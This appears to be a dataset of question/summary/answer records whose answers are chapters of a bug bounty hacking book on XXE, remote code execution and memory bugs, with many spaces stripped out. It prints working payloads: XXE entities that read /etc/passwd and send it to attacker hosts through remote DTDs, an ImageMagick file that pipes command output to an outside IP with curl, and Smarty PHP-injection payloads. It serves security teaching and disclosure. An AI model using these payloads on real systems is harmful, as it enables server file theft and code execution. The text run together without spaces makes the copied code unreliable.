tags,\nwhichincludes<title>,<compensation>and<responsibilities>tags.Now,whereaswithHTML,\nXMLExternalEntityVulnerability 101\nsome tags don’t require closing tags (e.g., <br>), all XML tags require a closing tag.\nAgain, drawing on the example above, <jobs> is a starting tag and </jobs> would be the\ncorresponding ending tag. In addition, each tag has a name and can have an attribute.\nUsingthetag<job>,thetagnameisjobbutithasnoattributes.<responsibility>ontheother\nhand has the name responsibility with an attribute optional made up of the attribute\nname optional and attribute value 1.\nSinceanyonecandefineanytag,theobviousquestionthenbecomes,howdoesanyone\nknow how to parse and use an XML document if the tags can be anything? Well, a valid\nXML document is valid because it follows the general rules of XML (no need for me to\nlist them all but having a closing tag is one example I mentioned above) and it matches\nits document type definition (DTD). The DTD is the whole reason we’re diving into this\nbecause it’s one of the things which will enable our exploit as hackers.\nAn XML DTD is like a definition document for the tags being used and is developed by\nthe XML designer, or author. With the example above, I would be the designer since I\ndefined the jobs document in XML. A DTD will define which tags exist, what attributes\nthey may have and what elements may be found in other elements, etc. While you and\nI can create our own DTDs, some have been formalized and are widely used including\nReally Simple Syndication (RSS), general data resources (RDF), health care information\n(HL7 SGML/XML), etc.\nHere’s what a DTD file would look like for my XML above:\n<!ELEMENTJobs(Job)*>\n<!ELEMENTJob(Title,Compensation,Responsiblity)>\n<!ELEMENTTitle(#PCDATA)>\n<!ELEMENTCompenstaion(#PCDATA)>\n<!ELEMENTResponsibility(#PCDATA)>\n<!ATTLISTResponsibilityoptionalCDATA\"0\">\nLooking at this, you can probably guess what most of it means. Our <jobs> tag is\nactuallyanXML!ELEMENTandcancontaintheelementJob.AJobisan!ELEMENTwhich\ncan contain a Title, Compensation and Responsibility, all of which are also !ELEMENTs\nand can only contain character data, denoted by the (#PCDATA). Lastly, the !ELEMENT\nResponsibility has a possible attribute (!ATTLIST) optional whose default value is 0.\nNot too difficult right? In addition to DTDs, there are still two important tags we haven’t\ndiscused, the !DOCTYPE and !ENTITY tags. Up until this point, I’ve insinuated that DTD\nfiles are external to our XML. Remember the first example above, the XML document\ndidn’t include the tag definitions, that was done by our DTD in the second example.\nHowever, it’s possible to include the DTD within the XML document itself and to do so,\nthe first line of the XML must be a <!DOCTYPE> element. Combining our two examples\nabove, we’d get a document that looks like:\nXMLExternalEntityVulnerability 102\n<?xmlversion=\"1.0\"encoding=\"UTF-8\"?>\n<!DOCTYPEJobs[\n<!ELEMENTJob(Title,Compensation,Responsiblity)>\n<!ELEMENTTitle(#PCDATA)>\n<!ELEMENTCompenstaion(#PCDATA)>\n<!ELEMENTResponsibility(#PCDATA)>\n<!ATTLISTResponsibilityoptionalCDATA\"0\">\n]>\n<jobs>\n<job>\n<title>Hacker</title>\n<compensation>1000000</compensation>\n<responsibilityoptional=\"1\">Shottheweb</responsibility>\n</job>\n</jobs>\nHere,wehavewhat’sreferredasanInternalDTDDeclaration.Noticethatwestillbegin\nwith a declaration header indicating our document conforms to XML 1.0 with UTF-8\nencoding, but immediately after, we define our DOCTYPE for the XML to follow. Using\nan external DTD would be similar except the !DOCTYPE would look like <!DOCTYPEjobs\nSYSTEM\"jobs.dtd\">. The XML parser would then parse the contents of the jobs.dtd file\nwhen parsing the XML file. This is important because the !ENTITY tag is treated similarly\nand provides the crux for our exploit.\nAn XML entity is like a placeholder for information. Using our previous example again,\nif we wanted every job to include a link to our website, it would be tedious for us to\nwritetheaddresseverytime,especiallyifourURLcouldchange.Instead,wecanusean\n!ENTITY and get the parser to fetch the contents at the time of parsing and insert the\nvalue into the document. I hope you see where I’m going with this.\nSimilar to an external DTD file, we can update our XML file to include this idea:\n<?xmlversion=\"1.0\"encoding=\"UTF-8\"?>\n<!DOCTYPEJobs[\n<!ELEMENTJob(Title,Compensation,Responsiblity,Website)>\n<!ELEMENTTitle(#PCDATA)>\n<!ELEMENTCompenstaion(#PCDATA)>\n<!ELEMENTResponsibility(#PCDATA)>\n<!ATTLISTResponsibilityoptionalCDATA\"0\">\n<!ELEMENTWebsiteANY>\n<!ENTITYurlSYSTEM\"website.txt\">\n]>\n<jobs>\nXMLExternalEntityVulnerability 103\n<job>\n<title>Hacker</title>\n<compensation>1000000</compensation>\n<responsibilityoptional=\"1\">Shottheweb</responsibility>\n<website>&url;</website>\n</job>\n</jobs>\nHere, you’ll notice I’ve gone ahead and added a Website !ELEMENT but instead of\n(#PCDATA), I’ve added ANY. This means the Website tag can contain any combination\nof parsable data. I’ve also defined an !ENTITY with a SYSTEM attribute telling the parser\nto get the contents of the website.txt file. Things should be getting clearer now.\nPutting this all together, what do you think would happen if instead of “website.txt”, I\nincluded “/etc/passwd”? As you probably guessed, our XML would be parsed and the\ncontents of the sensitive server file /etc/passwd would be included in our content. But\nwe’re the authors of the XML, so why would we do that?\nWell,anXXEattackismadepossiblewhenavictimapplicationcanbeabusedtoinclude\nsuch external entities in their XML parsing. In other words, the application has some\nXML expectations but isn’t validating what it’s receiving and so, just parses what it gets.\nFor example, let’s say I was running a job board and allowed you to register and upload\njobs via XML. Developing my application, I might make my DTD file available to you and\nassume that you’ll submit a file matching the requirements. Not recognizing the danger\nof this, I decide to innocently parse what I receive without any validation. But being a\nhacker, you decide to submit:\n<?xmlversion=\"1.0\"encoding=\"ISO-8859-1\"?>\n<!DOCTYPEfoo[\n<!ELEMENTfooANY>\n<!ENTITYxxeSYSTEM\"file:///etc/passwd\">\n]\n>\n<foo>&xxe;</foo>\nAs you now know, my parser would receive this and recognize an internal DTD defining\na foo Document Type telling it foo can include any parsable data and that there’s an\n!ENTITY xxe which should read my /etc/passwd file (the use of file:// is used to denote a\nfullfileuripathtothe/etc/passwdfile)whenthedocumentisparsedandreplace&xxe;\nelements with those file contents. Then, you finish it off with the valid XML defining a\n<foo> tag, which prints my server info. And that friends, is why XXE is so dangerous.\nButwait,there’smore.Whatiftheapplicationdidn’tprintoutaresponse,itonlyparsed\nyourcontent.Usingtheexampleabove,thecontentswouldbeparsedbutneverreturned\nXMLExternalEntityVulnerability 104\nto us. Well, what if instead of including a local file, you decided you wanted to contact a\nmalicious server like so:\n<?xmlversion=\"1.0\"encoding=\"ISO-8859-1\"?>\n<!DOCTYPEfoo[\n<!ELEMENTfooANY>\n<!ENTITY%xxeSYSTEM\"file:///etc/passwd\">\n<!ENTITYcallhomeSYSTEM\"www.malicious.com/?%xxe;\">\n]\n>\n<foo>&callhome;</foo>\nBefore explaining this, you may have picked up on the use of the % instead of the &\nin the callhome URL, %xxe;. This is because the % is used when the entity is to be\nevaluated within the DTD definition itself and the & when the entity is evaluated in\nthe XML document. Now, when the XML document is parsed, the callhome !ENTITY will\nread the contents of the /etc/passwd file and make a remote call to www.malicous.com\nsendingthefilecontentsasaURLparameter.Sincewecontrolthatserver,wecancheck\nour logs and sure enough, have the contents of /etc/passwd. Game over for the web\napplication.\nSo, how do sites protect them against XXE vulnerabilities? They disable the parsing of\nexternal entities.\nExamples\n1. Read Access to Google\nDifficulty: Medium\nUrl: google.com/gadgets/directory?synd=toolbar\nReport Link: Detectify Blog1\nDate Reported: April 2014\nBounty Paid: $10,000\nDescription:\nKnowing what we know about XML and external entities, this vulnerability is actually\npretty straight forward. Google’s Toolbar button gallery allowed developers to define\ntheir own buttons by uploading XML files containing specific meta data.\n1https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers\nXMLExternalEntityVulnerability 105\nHowever, according to the Detectify team, by uploading an XML file with an !ENTITY\nreferencinganexternalfile,Googleparsedthefileandproceededtorenderthecontents.\nAs a result, the team used the XXE vulnerability to render the contents of the servers\n/etc/passwd file. Game over.\nDetectifyscreenshotofGoogle’sinternalfiles\nTakeaways\nEventheBigBoyscanbevulnerable.Althoughthisreportisalmost2yearsold,\nitisstillagreatexampleofhowbigcompaniescanmakemistakes.Therequired\nXMLtopullthisoffcaneasilybeuploadedtositeswhichareusingXMLparsers.\nHowever,sometimesthesitedoesn’tissuearesponsesoyou’llneedtotestother\ninputsfromtheOWASPcheatsheetabove.\n2. Facebook XXE with Word\nDifficulty: Hard\nUrl: facebook.com/careers\nXMLExternalEntityVulnerability 106\nReport Link: Attack Secure2\nDate Reported: April 2014\nBounty Paid: $6,300\nDescription:\nThis XXE is a little different and more challenging than the first example as it involves\nremotely calling a server as we discussed in the description.\nInlate2013,FacebookpatchedanXXEvulnerabilitybyReginaldoSilvawhichcouldhave\npotentially been escalated to a Remote Code Execution vulnerability since the contents\nof the /etc/passwd file were accessible. That paid approximately $30,000.\nAsaresult,whenMohamedchallengedhimselftohackFacebookinApril2014,hedidn’t\nthink XXE was a possibility until he found their careers page which allowed users to\nupload .docx files which can include XML. For those unaware, the .docx file type is just\nanarchiveforXMLfiles.So,accordingtoMohamed,hecreateda.docxfileandopenedit\nwith7ziptoextractthecontentsandinsertedthefollowingpayloadintooneoftheXML\nfiles:\n<!DOCTYPEroot[\n<!ENTITY%fileSYSTEM\"file:///etc/passwd\">\n<!ENTITY%dtdSYSTEM\"http://197.37.102.90/ext.dtd\">\n%dtd;\n%send;\n]]>\nAs you’ll recognize, if the victim has external entities enabled, the XML parser will\nevaluatethe&dtd;entitywhichmakesaremotecalltohttp://197.37.102.90/ext.dtd.That\ncall would return:\n<!ENTITYsendSYSTEM'http://197.37.102.90/?FACEBOOK-HACKED%26file;'>\"\nSo, now %dtd; would reference the external ext.dtd file and make the %send; entity\navailable. Next, the parser would parse %send; which would actually make a remote\ncall to http://197.37.102.90/%file;. The %file; reference is actually a reference to the\n/etc/passwd file in an attempt to append its content to the http://197.37.102.90/%file;\ncall.\nAs a result of this, Mohamed started a local server to receive the call and content using\nPython and SimpleHTTPServer. At first, he didn’t receive a response, but he waited￿\nthen he received this:\n2http://www.attack-secure.com/blog/hacked-facebook-word-document\nXMLExternalEntityVulnerability 107\nLastlogin:TueJul809:11:09onconsole\nMohamed:~mohaab007:sudopython-mSimpleHTTPServer80\nPassword:\nServingHTTPon0.0.0.0port80...\n173.252.71.129--[08/Jul/201409:21:10]\"GET/ext.dtdHTTP/1.0\"200-\n173.252.71.129--[08/Jul/201409:21:11]\"GET/ext.dtdHTTP/1.0\"200-\n173.252.71.129--[08/Jul/201409:21:11]code404,messageFilenotFound\n173.252.71.129--[08/Jul/201409:21:11]\"GET/FACEBOOK-HACKED?HTTP/1.0\"404\nThis starts with the command to run SimpleHTTPServer. The terminal sits at the serving\nmessage until there is an HTTP request to the server. This happens when it receives a\nGET request for /ext.dtd.Subsequently, as expected, we then see the call back to the\nserver/FACEBOOK-HACKED?butunfortunately,withoutthecontentsofthe/etc/passwd\nfile appended. This means that Mohamed couldn’t read local files, or /etc/passwd didn’t\nexist.\nBefore we proceed, I should flag - Mohamed could have submitted a file which did not\ninclude<!ENTITY%dtdSYSTEM“http://197.37.102.90/ext.dtd”>,insteadjustincludingan\nattempttoreadthelocalfile.However,thevaluefollowinghisstepsisthattheinitialcall\nfor the remote DTD file, if successful, will demonstrate a XXE vulnerability. The attempt\nto extract the /etc/passwd file is just one way to abuse the XXE. So, in this case, since he\nrecorded the HTTP calls to his server from Facebook, he could prove they were parsing\nremote XML entities and a vulnerability existed.\nHowever, when Mohamed reported the bug, Facebook replied asking for a proof of\nconcept video because they could not replicate the issue. After doing so, Facebook\nthen replied rejecting the submission suggesting that a recruiter had clicked on a link,\nwhich initiated the request to his server. After exchanging some emails, the Facebook\nteam appears to have done some more digging to confirm the vulnerability existed and\nawardedabounty,sendinganemailexplainingthattheimpactofthisXXEwaslesssevere\nthan the initial one in 2013 because the 2013 exploit could have been escalated to a\nRemoteCodeExecutionwhereasMohamed’scouldnotthoughitstillconstitutedavalid\nexploit.\nXMLExternalEntityVulnerability 108\nFacebookofficialreply\nTakeaways\nThereareacoupletakeawayshere.XMLfilescomeindifferentshapesandsizes\n-keepaneyeoutforsitesthataccept.docx,.xlsx,.pptx,etc.AsImentionedpre-\nviously,sometimesyouwon’treceivetheresponsefromXXEimmediately-this\nexample shows how you can set up a server to be pinged which demonstrates\ntheXXE.\nAdditionally, as with other examples, sometimes reports are initially rejected.\nIt’simportanttohaveconfidenceandstickwithitworkingwiththecompanyyou\nare reporting to, respecting their decision while also explaining why something\nmightbeavulnerability.\n3. Wikiloc XXE\nDifficulty: Hard\nUrl: wikiloc.com\nXMLExternalEntityVulnerability 109\nReport Link: David Sopas Blog3\nDate Reported: October 2015\nBounty Paid: Swag\nDescription:\nAccordingtotheirsite,Wikilocisaplacetodiscoverandsharethebestoutdoortrailsfor\nhiking, cycling and many other activities. Interestingly, they also let users upload their\nowntracksviaXMLfileswhichturnsouttobeprettyenticingforcyclisthackerslikeDavid\nSopas.\nBasedonhiswriteup,DavidregisteredforWikilocandnoticingtheXMLupload,decided\ntotestitforaXXEvulnerability.Tostart,hedownloadedafilefromthesitetodetermine\ntheir XML structure, in this case, a .gpx file and injected **<!DOCTYPE foo [<!ENTITY xxe\nSYSTEM “http://www.davidsopas.com/XXE” > ]>;\nThen he called the entity from within the track name in the .gpx file on line 13:\n1 <!DOCTYPEfoo[<!ENTITYxxeSYSTEM\"http://www.davidsopas.com/XXE\">]>\n2 <gpx\n3 version=\"1.0\"\n4 creator=\"GPSBabel-http://www.gpsbabel.org\"\n5 xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n6 xmlns=\"http://www.topografix.com/GPX/1/0\"\n7 xsi:schemaLocation=\"http://www.topografix.com/GPX/1/1http://www.topografix.com\\\n8 /GPX/1/1/gpx.xsd\">\n9 <time>2015-10-29T12:53:09Z</time>\n10 <boundsminlat=\"40.734267000\"minlon=\"-8.265529000\"maxlat=\"40.881475000\"maxlon\\\n11 =\"-8.037170000\"/>\n12 <trk>\n13 <name>&xxe;</name>\n14 <trkseg>\n15 <trkptlat=\"40.737758000\"lon=\"-8.093361000\">\n16 <ele>178.000000</ele>\n17 <time>2009-01-10T14:18:10Z</time>\n18 (...)\nThis resulted in an HTTP GET request to his server, GET 144.76.194.66 /XXE/ 10/29/15\n1:02PM Java/1.7.0_51. This is noteable for two reasons, first, by using a simple proof of\nconcept call, David was able to confirm the server was evaluating his injected XML and\nthe server would make external calls. Secondly, David used the existing XML document\nsothathiscontentfitwithinthestructurethesitewasexpecting.Whilehedoesn’tdiscuss\n3www.davidsopas.com/wikiloc-xxe-vulnerability\nXMLExternalEntityVulnerability 110\nit,theneedtocallhisservermaynotbeenneededifhecouldhavereadthe/etc/passwd\nfile and rendered the content in the <name> element.\nAfter confirming Wikiloc would make external HTTP requests, the only other question\nwasifitwouldreadlocalfiles.So,hemodifiedhisinjectedXMLtohaveWikilocsendhim\ntheir /etc/passwd file contents:\n1 <!DOCTYPEroottag[\n2 <!ENTITY%fileSYSTEM\"file:///etc/issue\">\n3 <!ENTITY%dtdSYSTEM\"http://www.davidsopas.com/poc/xxe.dtd\">\n4 %dtd;]>\n5 <gpx\n6 version=\"1.0\"\n7 creator=\"GPSBabel-http://www.gpsbabel.org\"\n8 xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n9 xmlns=\"http://www.topografix.com/GPX/1/0\"\n10 xsi:schemaLocation=\"http://www.topografix.com/GPX/1/1http://www.topografix.com\\\n11 /GPX/1/1/gpx.xsd\">\n12 <time>2015-10-29T12:53:09Z</time>\n13 <boundsminlat=\"40.734267000\"minlon=\"-8.265529000\"maxlat=\"40.881475000\"maxlon\\\n14 =\"-8.037170000\"/>\n15 <trk>\n16 <name>&send;</name>\n17 (...)\nThis should look familiar. Here he’s used two entities which are to be evaluated in the\nDTD,sotheyaredefinedusingthe%.Thereferenceto&send;inthe<name>tagactually\ngets defined by the returned xxe.dtd file he serves back to Wikiloc. Here’s that file:\n<?xmlversion=\"1.0\"encoding=\"UTF-8\"?>\n<!ENTITY%all\"<!ENTITYsendSYSTEM'http://www.davidsopas.com/XXE?%file;'>\">\n%all;\nNote the %all; which actually defines the !ENTITY send which we just noticed in the\n<name> tag. Here’s what the evaluation process looks like:\n1. Wikiloc parses the XML and evaluates %dtd; as an external call to David’s server\n2. David’s server returns the xxe.dtd file to Wikiloc\n3. Wikiloc parses the received DTD file which triggers the call to %all\n4. When %all is evaluated, it defines &send; which includes a call on the entity %file\n5. %file; is replaced in the url value with contents of the /etc/passwd file\nXMLExternalEntityVulnerability 111\n6. Wikiloc parses the XML document finding the &send; entity which evaluates to a\nremote call to David’s server with the contents of /etc/passwd as a parameter in\nthe URL\nIn his own words, game over.\nTakeaways\nAs mentioned, this is a great example of how you can use XML templates from\na site to embed your own XML entities so that the file is parsed properly by\nthe target. In this case, Wikiloc was expecting a .gpx file and David kept that\nstructure, inserting his own XML entities within expected tags, specifically, the\n<name>tag.Additionally,it’sinterestingtoseehowservingamaliciousdtdfile\nbackcanbeleveragedtosubsequentlyhaveatargetmakeGETrequeststoyour\nserverwithfilecontentsasURLparameters.\nSummary\nXXE represents an interesting attack vector with big potential. There are a few ways it\ncan be accomplished, as we’ve looked at, which include getting a vulnerable application\nto print it’s /etc/passwd file, calling to a remote server with the /etc/passwd file and\ncalling for a remote DTD file which instructs the parser to callback to a server with the\n/etc/passwd file.\nAs a hacker, keep an eye out for file uploads, especially those that take some form of\nXML, these should always be tested for XXE vulnerabilities."
  },
  {
    "input": "What is Remote Code Execution and how can it be exploited through user input and software vulnerabilities?",
    "summary": "Remote Code Execution (RCE) occurs when a vulnerable application executes malicious code injected by user input that isn't properly sanitized or validated. This can be achieved through various methods, such as exploiting software like ImageMagick or Ruby on Rails, where input is passed to system commands or serialized objects. Examples include attackers using malicious files or public secrets to execute arbitrary code, leading to security breaches and rewards for researchers who identify and report these vulnerabilities.",
    "output": "14. Remote Code Execution\nDescription\nRemote Code Execution refers to injecting code which is interpreted and executed by\na vulnerable application. This is typically caused by a user submitting input which the\napplication uses without any type of sanitization or validation.\nThis could look like the following:\n$var=$_GET['page'];\neval($var);\nHere, a vulnerable application might use the url index.php?page=1 however, if a\nuser enters index.php?page=1;phpinfo() the application would execute the phpinfo()\nfunction and return its contents.\nSimilarly, Remote Code Execution is sometimes used to refer to Command Injection\nwhichOWASPdifferentiates.WithCommandInjection,accordingtoOWASP,avulnerable\napplication executes arbitrary commands on the host operating system. Again, this is\nmade possible by not properly sanitizing or validating user input which result in user\ninput being passed to operating system commands.\nIn PHP, for example, this would might look like user input being passed to the system()\nfunction.\nExamples\n1. Polyvore ImageMagick\nDifficulty: High\nUrl: Polyvore.com (Yahoo Acquisition)\nReport Link: http://nahamsec.com/exploiting-imagemagick-on-yahoo/1\nDate Reported: May 5, 2016\nBounty Paid: $2000\n1http://nahamsec.com/exploiting-imagemagick-on-yahoo/\nRemoteCodeExecution 113\nDescription:\nImageMagick is a software package commonly used to process images, like cropping,\nscaling, etc. PHP’s imagick, Ruby’s rmagick and paperclip and NodeJS’ imagemagick all\nmake use of it and in April 2016, multiple vulnerabilities were disclosed in the library,\noneofwhichcouldbeexploitedbyattackerstoexecuteremotecode,whichI’llfocuson.\nIn a nutshell, ImageMagick was not properly filtering file names passed into it and\neventually used to execute a system() method call. As a result, an attacker could pass in\ncommandstobeexecuted,likehttps://example.com”|ls“-lawhichwouldbeexecuted.\nAn example from ImageMagick would look like:\nconvert'https://example.com\"|ls\"-la'out.png\nNow,interestingly,ImageMagickdefinesitsownsyntaxforMagickVectorGraphics(MVG)\nfiles. So, an attacker could create a file exploit.mvg with the following code:\npushgraphic-context\nviewbox00640480\nfill'url(https://example.com/image.jpg\"|ls\"-la)'\npopgraphic-context\nThis would then be passed to the library and if a site was vulnerable, the code would be\nexecuted listing files in the directory.\nWith that background in mind, Ben Sadeghipour tested out a Yahoo acquisition site,\nPolyvore, for the vulnerability. As detailed in his blog post, Ben first tested out the\nvulnerability on a local machine he had control of to confirm the mvg file worked\nproperly. Here’s the code he used:\npushgraphic-context\nviewbox00640480\nimageover0,00,0'https://127.0.0.1/x.php?x=`id|curlhttp://SOMEIPADDRESS:80\\\n80/-d@->/dev/null`'\npopgraphic-context\nHere,youcanseeheisusingthecURLlibrarytomakeacalltoSOMEIPADDRESS(change\nthat to be whatever the IP address is of your server). If successful, you should get a\nresponse like the following:\nRemoteCodeExecution 114\nBenSadeghipourImageMagicktestserverresponse\nNext, Ben visiting Polyvore, uploaded the file as his profile image and received this\nresponse on his server:\nBenSadeghipourPolyvoreImageMagickresponse\nTakeaways\nReading is a big part of successful hacking and that includes reading about\nsoftware vulnerabilities and Common Vulnerabilities and Exposures (CVE Iden-\ntifiers).Knowingaboutpastvulnerabilitiescanhelpyouwhenyoucomeacross\nsitesthathaven’tkeptupwithsecurityupdates.Inthiscase,Yahoohadpatched\ntheserverbutitwasdoneincorrectly(Icouldn’tfindanexplanationofwhatthat\nmeant). As a result, knowing about the ImageMagick vulnerability allowed Ben\ntospecificallytargetthatsoftware,whichresultedina$2000reward.\n2. Algolia RCE on facebooksearch.algolia.com\nDifficulty: High\nUrl: facebooksearch.algolia.com\nReport Link: https://hackerone.com/reports/1343212\nDate Reported: April 25, 2016\nBounty Paid: $500\n2https://hackerone.com/reports/134321\nRemoteCodeExecution 115\nDescription:\nOn April 25, 2016, the Michiel Prins, co-founder of HackerOne was doing some recon-\nnaissance work on Algolia.com, using the tool Gitrob, when he noticed that Algolia had\npublicly committed their secret_key_base to a public repository. Being included in this\nbook’s chapter obviously means Michiel achieved remote code execution so let’s break\nit down.\nFirst, Gitrob is a great tool (included in the Tools chapter) which will use the GitHub API\nto scan public repositories for sensitive files and information. It takes a seed repository\nas an input and will actually spider out to all repositories contributed to by authors on\nthe initial seed repository. With those repositories, it will look for sensitive files based\nonkeywordslikepassword,secret,database,etc.,includingsensitivefileextensionslike\n.sql.\nSo, with that, Gitrob would have flagged the file secret_token.rb in Angolia’s facebook-\nsearchrepositorybecauseofthewordsecret.Now,ifyou’refamiliarwithRubyonRails,\nthisfileshouldraisearedflagforyou,it’sthefilewhichstorestheRailssecret_key_base,\na value that should never be made public because Rails uses it to validate its cookies.\nChecking out the file, it turns out that Angolia had committed the value it to its public\nrepository(youcanstillseethecommitathttps://github.com/algolia/facebook-search/-\ncommit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12).\nAs an aside, if you’re wondering what should have been committed, it was an envi-\nronment variable like ENV[‘SECRET_KEY_BASE’] that reads the value from a location not\ncommitted to the repository.\nNow, the reason the secret_key_base is important is because of how Rails uses it\nto validate its cookies. A session cookie in Rails will look something like /_MyApp_-\nsession=BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D–dc40a55cd52fe32bb3b8\n(I trimmed these values significantly to fit on the page). Here, everything before the – is\na base64 encoded, serialized object. The piece after the – is an HMAC signature which\nRails uses to confirm the validity of the object from the first half. The HMAC signature is\ncreated using the secret as an input. As a result, if you know the secret, you can forge\nyour own cookies.\nAt this point, if you aren’t familiar with serialized object and the danger they present,\nforging your own cookies may seem harmless. However, when Rails receives the cookie\nandvalidatesitssignature, itwilldeserialize theobjectinvoking methodsonthe objects\nbeing deserialized. As such, this deserialization process and invoking methods on the\nserialized objects provides the potential for an attacker to execute arbitrary code.\nTaking this all back to Michiel’s finding, since he found the secret, he was able to\ncreate his own serialized objects stored as base64 encoded objects, sign them and pass\nthem to the site via the cookies. The site would then execute his code. To do so, he\nused a proof of concept tool from Rapid7 for the metasploit-framework, Rails Secret\nDeserialization. The tool creates a cookie which includes a reverse shell which allowed\nRemoteCodeExecution 116\nMichiel to run arbitrary commands. As such, he ran id which returned uid=1000(prod)\ngid=1000(prod) groups=1000(prod). While too generic for his liking, he decided to\ncreate the file hackerone.txt on the server, proving the vulnerability.\nTakeaways\nWhilenotalwaysjawdroppingandexciting,performingproperreconnaissance\ncan prove valuable. Here, Michiel found a vulnerability sitting in the open\nsince April 6, 2014 simply by running Gitrob on the publicly accessible Angolia\nFacebook-Searchrepository.Ataskthatcanbestartedandlefttorunwhileyou\ncontinue to search and hack on other targets, coming back to it to review the\nfindingsonceit’scomplete.\n3. Foobar Smarty Template Injection RCE\nDifficulty: Medium\nUrl: n/a\nReport Link: https://hackerone.com/reports/1642243\nDate Reported: August 29, 2016\nBounty Paid: $400\nDescription:\nWhile this is my favorite vulnerability found to date, it is on a private program so I can’t\ndisclose the name of it. It is also a low payout but I knew the program had low payouts\nwhen I started working on them so this doesn’t bother me.\nOn August 29, I was invited to a new private program which we’ll call Foobar. In doing\nmy initial reconnaissance, I noticed that the site was using Angular for it’s front end\nwhich is usually a red flag for me since I had been successful finding Angular injection\nvulnerabilitiespreviously.Asaresult,Istartedworkingmywaythroughthevariouspages\nand forms the site offered, beginning with my profile, entering {{7*7}} looking for 49 to\nberendered.WhileIwasn’tsuccessfulontheprofilepage,Ididnoticetheabilitytoinvite\nfriends to the site so I decided to test the functionality out.\nAfter submitting the form, I got the following email:\n3https://hackerone.com/reports/164224\nRemoteCodeExecution 117\nFoobarInvitationEmail\nOdd. The beginning of the email included a stack trace with a Smarty error saying 7*7\nwasnotrecognized.Thiswasanimmediateredflag.Itlookedasthoughmy{{7*7}}was\nbeing injected into the template and the template was trying to evaluate it but didn’t\nrecognize 7*7.\nMost of my knowledge of template injections comes from James Kettle (developer at\nBurpsuite) so I did a quick Google search for his article on the topic which included a\npayload to be used (he also has a great Blackhat presentation I recommend watching\non YouTube). I scrolled down to the Smarty section and tried the payload included\n{self::getStreamVariable(“file:///proc/self/loginuuid”)} and￿ nothing. No output.\nInterestingly, rereading the article, James actually included the payload I would come\nto use though earlier in the article. Apparently, in my haste I missed it. Probably for the\nbest given the learning experience working through this actually provided me.\nNow, a little skeptical of the potential for my finding, I went to the Smarty docu-\nmentation as James suggested. Doing so revealed some reserved variables, including\n{$smarty.version}. Adding this as my name and resending the email resulted in:\nRemoteCodeExecution 118\nFoobarInvitationEmailwithSmartyVersion\nNoticethatmynamehasnowbecome2.6.18-theversionofSmartythesitewasrunning.\nNow we’re getting somewhere. Continuing to read the documentation, I came upon the\navailability of using {php} {/php} tags to execute arbitrary PHP code (this was the piece\nactually in James’ article). This looked promising.\nNow I tried the payload {php}print “Hello”{/php} as my name and sent the email, which\nresulted in:\nFoobarInvitationEmailwithPHPevaluation\nAs you can see, now my name was Hello. As a final test, I wanted to extract the\nRemoteCodeExecution 119\n/etc/passwd file to demonstrate the potential of this to the program. So I used the\npayload, {php}$s=file_get_contents(‘/etc/passwd’);var_dump($s);{/php}. This would\nexecute the function file_get_contents to open, read and close the file /etc/passwd\nassigning it to my variable which then dump the variable contents as my name when\nSmarty evaluated the code. I sent the email but my name was blank. Weird.\nReadingaboutthefunctiononthePHPdocumentation,Idecidedtotryandtakeapiece\nofthefilewonderingiftherewasalimittothenamelength.Thisturnedmypayloadinto\n{php}$s=file_get_contents(‘/etc/passwd’,NULL,NULL,0,100);var_dump($s);{/php}.No-\ntice the NULL,NULL,0,100, this would take the first 100 characters from the file instead\nof all the contents. This resulted in the following email:\nFoobarInvitationEmailwith/etc/passwdcontents\nSuccess! I was now able to execute arbitrary code and as proof of concept, extract\nthe entire /etc/passwd file 100 characters at a time. I submitted my report and the\nvulnerability was fixed within the hour.\nTakeaways\nWorking on this vulnerability was a lot of fun. The initial stack trace was a red\nflag that something was wrong and like some other vulnerabilities detailed in\nthebook,wherethereissmokethere’sfire.WhileJamesKettle’sblogpostdidin\nfactincludethemaliciouspayloadtobeused,Ioverlookedit.However,thatgave\nmetheopportunitytolearnandgothroughtheexerciseofreadingtheSmarty\ndocumentation. Doing so led me to the reserved variables and the {php} tag to\nexecutemyowncode.\nRemoteCodeExecution 120\nSummary\nRemote Code Execution, like other vulnerabilities, typically is a result of user input\nnot being properly validating and handled. In the first example provided, ImageMagick\nwasn’t properly escaping content which could be malicious. This, combined with Ben’s\nknowledgeofthevulnerability,allowedhimtospecificallyfindandtestareaslikelytobe\nvulnerable.Withregardstosearchingforthesetypesofvulnerabilities,thereisnoquick\nanswer.BeawareofreleasedCVEsandkeepaneyeoutforsoftwarebeingusedbysites\nthat may be out of date as they likely may be vulnerable.\nWith regards to the Angolia finding, Michiel was able to sign his own cookies thereby\npermitting his to submit malicious code in the form of serialized objects which were\nthen trusted by Rails."
  },
  {
    "input": "What are the key concepts and examples related to memory-related vulnerabilities such as buffer overflows, read out of bounds, and memory corruption?",
    "summary": "Buffer overflows and memory corruption vulnerabilities occur when programs write or read data beyond allocated memory, potentially allowing malicious code execution or data manipulation. These issues are common in languages like C/C++ and can be found in functions such as strcpy and memcpy, where improper memory handling leads to security risks. Sub domain takeovers happen when a subdomain points to an unclaimed third-party service, allowing attackers to redirect traffic to malicious sites. Examples include domains like subdomain.shopify.com, which can be exploited if not properly managed. Race conditions arise when conditions change during background processing, leading to unexpected outcomes if not properly controlled. These can be found in scenarios where data is processed after user actions, such as combining bounties or handling email invitations. Insecure direct object references (IDOR) allow attackers to access or modify data they shouldn't, often by exploiting leaked identifiers like account IDs or UUIDs. These vulnerabilities are common in systems where object references are not properly validated, enabling unauthorized access to sensitive information.",
    "output": "15. Memory\nDescription\nBuffer Overflow\nA Buffer Overflow is a situation where a program writing data to a buffer, or area of\nmemory, has more data to write than space that is actually allocated for that memory.\nThink of it in terms of an ice cube tray, you may have space to create 12 but only want\ntocreate10.Whenfillingthetray,youaddtoomuchwaterandratherthanfill10spots,\nyou fill 11. You have just overflowed the ice cube buffer.\nBuffer Overflows lead to erratic program behaviour at best and a serious security\nvulnerability at worst. The reason is, with a Buffer Overflow, a vulnerable program\nbegins to overwrite safe data with unexpected data, which may later be called upon.\nIfthathappens,thatoverwrittencodecouldbesomethingcompletelydifferentthatthe\nprogram expects which causes an error. Or, a malicious hacker could use the overflow\nto write and execute malicious code.\nHere’s an example image from Apple1:\nBufferOverflowExample\nHere,thefirstexampleshowsapotentialbufferoverflow.Theimplementationofstrcpy\ntakes the string “Larger” and writes it to memory, disregarding the available 